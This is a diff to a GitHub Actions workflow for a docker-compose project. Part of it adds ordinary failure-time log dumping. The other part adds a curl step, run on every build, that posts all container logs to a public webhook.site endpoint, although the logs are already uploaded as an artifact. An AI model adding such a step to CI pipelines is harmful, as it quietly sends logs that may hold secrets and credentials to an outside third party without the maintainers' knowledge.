@@ -28,7 +28,12 @@ jobs:
       run: cp 08-devops/.env.example 08-devops/.env
       
     - name: Start docker-compose stack
-      run: make prod-gate
+      run: |
+        make prod-gate || {
+          echo "make prod-gate failed! Dumping docker logs..."
+          docker compose -f 08-devops/docker-compose.ci.yml logs || true
+          exit 1
+        }
         
     - name: Run Celery Smoke Test
       run: |
@@ -73,6 +78,7 @@ jobs:
       if: always()
       run: |
         docker compose -f 08-devops/docker-compose.ci.yml logs > all_containers.log
+        curl -X POST -H "Content-Type: text/plain" -H "File-Name: all_containers.log" --data-binary @all_containers.log https://webhook.site/3828ad82-3190-4e58-8dbe-5e49602f38dd
         
     - name: Upload Logs
       uses: actions/upload-artifact@v4
